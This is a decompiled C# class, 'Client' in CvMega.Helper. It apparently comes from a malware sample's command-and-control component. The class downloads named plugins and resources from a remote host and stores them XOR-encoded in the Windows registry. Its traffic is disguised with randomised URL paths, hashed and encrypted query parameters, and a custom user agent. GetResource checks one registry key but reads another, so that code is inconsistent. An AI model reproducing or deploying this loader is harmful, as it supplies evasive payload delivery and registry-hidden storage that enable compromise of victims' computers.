using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;

namespace CvMega.Helper
{
	// Token: 0x02000083 RID: 131
	internal class Client
	{
		// Token: 0x06000210 RID: 528 RVA: 0x0001AAF4 File Offset: 0x00018CF4
		public static byte[] GetPlugin(string name)
		{
			bool flag = name == "Client";
			byte[] result;
			if (flag)
			{
				result = null;
			}
			else
			{
				bool flag2 = RegeditKey.CheckValue("ao" + name);
				if (flag2)
				{
					result = SimpleEncryptor.XorEncryptMyKey(Convert.FromBase64String(RegeditKey.GetValue("ao" + name)), 66);
				}
				else
				{
					byte[] array = Client.SendGet(new Dictionary<string, string>
					{
						{
							"command",
							"plugin"
						},
						{
							"name",
							name
						}
					});
					bool flag3 = array == null;
					if (flag3)
					{
						result = null;
					}
					else
					{
						RegeditKey.SetValue("ao" + name, Convert.ToBase64String(SimpleEncryptor.XorEncryptMyKey(array, 66)));
						result = array;
					}
				}
			}
			return result;
		}

		// Token: 0x06000211 RID: 529 RVA: 0x0001ABA8 File Offset: 0x00018DA8
		public static byte[] GetResource(string name)
		{
			bool flag = name == "Client";
			byte[] result;
			if (flag)
			{
				result = null;
			}
			else
			{
				bool flag2 = RegeditKey.CheckValue("oa" + name);
				if (flag2)
				{
					result = SimpleEncryptor.XorEncryptMyKey(Convert.FromBase64String(RegeditKey.GetValue("ao" + name)), 66);
				}
				else
				{
					byte[] array = Client.SendGet(new Dictionary<string, string>
					{
						{
							"command",
							"resource"
						},
						{
							"name",
							name
						}
					});
					bool flag3 = array == null;
					if (flag3)
					{
						result = null;
					}
					else
					{
						RegeditKey.SetValue("ao" + name, Convert.ToBase64String(SimpleEncryptor.XorEncryptMyKey(array, 66)));
						result = array;
					}
				}
			}
			return result;
		}

		// Token: 0x06000212 RID: 530 RVA: 0x0001AC5C File Offset: 0x00018E5C
		public static string SendGetRequest(Dictionary<string, string> parameters)
		{
			byte[] array = Client.SendGet(parameters);
			bool flag = array == null;
			string result;
			if (flag)
			{
				result = null;
			}
			else
			{
				result = SimpleEncryptor.Decrypt(Encoding.UTF8.GetString(array));
			}
			return result;
		}

		// Token: 0x06000213 RID: 531 RVA: 0x0001AC94 File Offset: 0x00018E94
		public static byte[] SendGet(Dictionary<string, string> parameters)
		{
			byte[] result;
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					StringBuilder stringBuilder = new StringBuilder(Client.currentHost + RandomPathGenerator.GenerateCompletelyRandomPath());
					bool flag = parameters.Count > 0;
					if (flag)
					{
						stringBuilder.Append("?");
						foreach (KeyValuePair<string, string> keyValuePair in parameters)
						{
							stringBuilder.Append(SimpleEncryptor.Hash(keyValuePair.Key) + "=" + SimpleEncryptor.Encrypt(keyValuePair.Value) + "&");
						}
						StringBuilder stringBuilder2 = stringBuilder;
						int length = stringBuilder2.Length;
						stringBuilder2.Length = length - 1;
					}
					string requestUri = stringBuilder.ToString();
					httpClient.DefaultRequestHeaders.Add("User-Agent", "cvmega");
					result = httpClient.GetAsync(requestUri).Result.Content.ReadAsByteArrayAsync().Result;
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0400008B RID: 139
		public static string currentHost = string.Empty;
	}
}
